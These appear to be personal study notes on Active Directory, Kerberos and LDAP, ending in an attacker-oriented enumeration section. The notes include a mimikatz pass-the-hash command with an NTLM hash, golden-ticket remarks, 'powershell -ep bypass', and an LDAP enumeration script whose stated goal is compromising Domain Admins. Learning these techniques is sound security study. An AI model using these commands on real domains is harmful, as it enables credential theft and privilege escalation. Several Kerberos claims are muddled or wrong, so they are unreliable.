# Active Directory 101
* 'Forest root' is the first domain and can NOT be changed for the life time of the AD
* 'Forest root' domain contains service Admins groups for Enterprise and Schema Admins
* Domain Controller (DC) store all key authentication and authorization services
* Domain Controller (DC) replicate AD services between others
* Domain Controller (DC) implement the role of DNS server for the entire Forest
* Kerberos is the main network protocol, v5 used sind Windows Server 2003
* Kerberos parties involved in authentication are called *principals*
  * User principal (UPN): user@DOMAIN.COM
  * Service principal (SPN): ldap/dc01, ldap/dc01.domain.com ldap/dc01.domain.com/domain.com
* Kerberos uses DC as Key distribution Center (KDC) and ticket system
* KDC runs as a **privileged process** on all domain controllers
* KDC uses **shared key** for symmetric encryption in most cases
* Kerberos requires **NTLM Hash** to encrypt the timetamp in AS_REQ
* Kerberos can be downgraded to NTLM Authentication: disabled by default
* Kerberos most important password is **KRBTGT** used encrypt TGT by KDC
* MS Kerberos NTLM hash does NOT salt **KRBTGT** using "user@DOMAIN.COM"
* MS Kerberos NTLM hash stores **maximum of 14 chars** due to MD4
* MS Kerberos is vulnerable to **pass-the-hash attacks**, because TGT is portable
* MS Kerberos is changed on desaster recovery only
* MS Kerberos allows golden ticket TGTs which valid 10 years (mimikatz)
* MS Kerberos are NOT validated if issued timestamp < 20 min ago
  * ALL additionally security settings are disabled: logon hours, ...
  * can be passed and used for any service that use Kerberos
  * can be used to downgrade cryptographic algorithm
  * can be created for arbitrary user and groups to by pass user group restrictions
  * can be created for non-existent user in the domain
* MS Active Directory Certification Services (ADCS)
* MS Active Directory Federal Services (ADFS)
  * Getting started 
  * https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview

## Remote Desktop

```bash
rdesktop -u [user] -p [password] -d [domainName] [ip:port]
```

## Use NTLM pass-the-hash to create Kerberos TGTs 
* insert stolen NTLM hash into memory
* wipeout other NTLM hashes
* create a new TGT using HT hash only
* https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf

```powershell
mimekatz 
sekurlsa::pth /user:Administrator /domain:example.com /ntlm:8846F7EAEE8FB117AD06BDD830B7586D
sekurlsa::ekeys
```
  
## Kerberos 101

```plain
# Timestamp to avoid replay attacks
# Session Key can decrypted by the client
# TGT is encrypted by KDC and can NOT be decrypted by the client, default: 10h!
c -> a: Authicatation Request (AS_REQ) encrypted timestamp using H(user+password)
c <- a: Authentication Server Reply (AS_REP) with encrypted session key and Ticket Granting Ticket (TGT) which contains the session key, domain, client IP

# Authenticator verifies timestamp, username, client IP
c -> a: Ticket Granting Service Request (TGS_REQ) encrypted user+timestamp with session key, plus the name of the resource and TGT
c <- a: Ticket Granting Server Reply (TGS_REP) contains service name, new session key, service ticket with user and group membership encrypted by H(service+credentials)

# Service Ticket can be decrypted by KDC and Service!
# Service verifies username match and assign permisison base on the Service Ticket
c -> s: Application Request (AP_REQ) encrypted user+timestamp with new session key, plus the service ticket
c <- s: Service Authentication
```

## LDAP 101
* Lightweight Directory Aceess Protocol
* Store, Retrieve, Search, Authenticate
* Open Standard
* Uses Simple Authentication and Security Layer (SASL)
  * Support MFA with One-Time Passwords
  * Support fine-grained access controls that restrict which 
    entries, attributes, and values any individual user can access
* LDAP Ports 
  * TCP/389 (unencrypted)
  * TCP/636 (encrypted channel over TLS)
* that restrict which entries, attributes, and values any individual user can access
* Getting started https://ldap.com/use-ldap/
* LDAPv3 Protocol https://ldap.com/ldapv3-wire-protocol-reference/

# Active Directory Elements
* AD Security Identfier (SID) 
* S-1-5-domainID-resourceID
* e.g. S-1-5-21-2536614405-3629634762-1218571035-1116
* Windows Server Manager -> Tools -> Active Directory Users and Computers

All data is stored either directly at the Forest level or inside an Organizational Unit (OU). The structure of objects and OUs in Active Directory can be compared to files and folders on a file system.

Note Active Directory cmdlets are only installed by default on Domain Controllers.

* https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools
* https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools#rsat-for-windows-10-version-1809-or-later-versions

```powershell
Get-ADUser username
Get-ADComputer computername
Get-ADGroup group
Get-ADGroupMember group -recursive
```

## AD Users
* Domain account
* User Principal Name (UPN): e.g.  user@DOMAIN.COM
* Applications that use domain resources use domain account (Kerberos: service account)

Search and filter for Users

* -Server 
* -Identity 
  * A distinguished name
  * A GUID (objectGUID)
  * A security identifier (objectSid)
  * A SAM account name (sAMAccountName)
* -Properties specifiy what to receive from output object 
* -Filter search for and retrieve more than one user, use the Filter
* -LDAPFilter specifies an LDAP query string that is used to filter Active Directory objects
* -SearchBase specifies an Active Directory path to search under.

```powershell
Get-ADUser -Filter * -SearchBase "OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM"
Get-ADUser -Filter 'Name -like "*SvcAccount"' | Format-Table Name, SamAccountName -A
Get-ADUser -Identity 'ChewDavid' -Properties *
Get-ADUser -Identity 'ChewDavid' -Properties "Title"
Get-ADUser -Filter "Name -eq 'ChewDavid'" -SearchBase "DC=AppNC" -Properties "mail" -Server lds.Fabrikam.com:50000
```

Get all enable/active users accounts

```powershell
Get-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)'
```

Managed Service Account (sMSA) is a managed domain account that provides **automatic password management**, simplified service principal name (SPN) management and the ability to delegate the management to other administrators.
The group Managed Service Account (gMSA) provides the same functionality within the domain and also extends that functionality over multiple servers.
The Microsoft Key Distribution Service (kdssvc.dll) lets you securely obtain the key with a key identifier for an Active Directory account. The **Key Distribution Service shares a secret** that's used to create keys for the account. 
For a gMSA, the domain controller computes the password on the key that the Key Distribution Services provides, along with other attributes of the gMSA. Member hosts can obtain the current and preceding password values by contacting a domain controller.

Benefits of group Managed Service Account (gMSA):

* password must be 120 characters
* password must be changed every 30 days

## AD Groups

* Limitation: Require DNS server
* Tools -> AD User and Computers
* Domain Admins are domain administrators, which means they **have unrestricted access** to the entire domain.
* Enterprise Admins group is also a **domain administrator of any other domain** in the Forest.

```powershell
Get-ADGroup "Remote Desktop Users" -Properties "Description"
Get-ADGroupMember "Remote Desktop Users" -recursive
```

Two main groups exist: Security groups and Distribution groups. 
* Security groups on the other hand are used for **security permissions**.
* Distribution groups are only used to define **email lists** and do not have any access rights or permission abilities. 

## AD Group Policies
* AD GPOs are XML configuration files
* AD GPOs are hosted on `\\<domain controller host name>\sysvol` 
* AD members and computers have READ permissions
* Windows Server Manager -> Tools -> Group Policy Management
* GPO Editor has two main categories for users and computers
* Computer related settings **override user setttings**

Generate the final policy result for an computer

```powershell
gpupdate /force
gpresult /H result-policy.html
```

GPOs have built-in Conflict Management, the last will be the effective one.
* Local
* Domain
* OU (parent, then child)

AD-related  MMC will allow you to browse the AD for the correct Active Directory container and define Group Policy based on the selected scope of management (SOM). Examples of Active Directory-related snap-ins include the *Active Directory Users and Computers snap-in* and the *Active Directory Sites and Services snap-in*.

## AD Enumeration

Active Directory (AD), is a service that acts as management layer and allows system administrators to update and manage operating systems, applications, users, and data access on a large scale.

An AD environment has a critical dependency on the Domain Name System (DNS) service. A typical domain controller will host a DNS server that is authoritative for the given domain. Since the Domain  Controller (DC) is such a central domain component, we'll also pay  attention to DC as we enumerate AD.

### AD Enum Automation Tools

### AD Enum Manual

Goals

* Compromise members of **Domain Admins** to gain control over **Domain Tree**.s
* Compsromise members of **Enterprise Admins** to gain full access over all DCs in the **Domain Forest**.

Scenario

* Domain User credentials are known to us
* Domain User has Remote Desktop permissions on machine wihtin the domain
* Limitation: User is NOT a local admin
* Asumptions: Start enum  with lower privileged user and repeat enum with each compromised user (pivot)

Attacker

```bash
xfreerdp3 +clipboard /cert:ignore /d:corp.com /u:user /v:IP /p:'Passw@rd!!'
```

Victim

```shell
# List domain users and groups to enum Domain Admins or Enterprise Admins
# Limitations: lists no nested groups, no specific attributes 
net user /domain
net user "someuser" /domain
net group /domain
net group "somegroup" /domains
```

```powershell
# LDAP enumeration using Active Directory Service Interfaces (ADSI) 
# LDAP://HostName[:PortNumber][/DistinguishedName]
# e.g. CN=Jeff,DC=corp,DC=com
notepad ad-enum-manually.ps1

# LDAP search with ldap query
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    # Get the Primary DC (PDC) with PdcRoleOwer = ...
    $pdc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    # Get LDAP destinguied name
    $dn = ([adsi]'').distinguishedName
    # Build LDAP path
    $ldap = "LDAP://$pdc/$dn"
    $ldap

    # Search from LDAP domain root directory endpoint
    # Filter for user objects only 0x30000000 (805306368)
    # Filter for a specific member e.g. jeff
    # $dirsearcher.filter = "samAccountType=805306368"
    # $dirsearcher.filter = "name=jeff"
    # New-Object System.DirectoryServices.DirectoryEntry($ldap)  
    $direntry = New-Object System.DirectoryServices.DirectoryEntry($ldap)
    ($direntry)
    $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry, $LDAPQuery)
    return $dirsearcher.FindAll() 
}

# Foreach($obj in $result)
# {
#     Foreach($prop in $obj.Properties)
#     {
#         $prop
#     }
# }
```

```powershell
powershell -ep bypass
Import-Module -Force .\ad-enum-manally.ps1

# AD User search
LDAPSearch -LDAPQuery "(name=jeff)"
LDAPSearch -LDAPQuery "(name=jeff)" | % { $_.properties | Format-List }
LDAPSearch -LDAPQuery "(name=jeff)" | % { $_.properties.PropertyNames }

# AD User enumeration
LDAPSearch -LDAPQuery "(objectcategory=user)" | % { $_.properties.cn}
LDAPSearch -LDAPQuery "(samAccountType=805306368)" | % {$_.properties.cn}

# Enumerate groups and members 
LDAPSearch -LDAPQuery "(objectcategory=group)" | % { "-> Group",$_.properties.cn,"-> Members",$_.properties.member }
Foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.properties | select {$_.cn}, {$_.member} }

# AD Group enumeration
LDAPSearch -LDAPQuery "(objectclass=group)" | % { $_.Properties.cn}

# AD Group nested member enumeration
LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))" | % { $_.Properties.member }
```
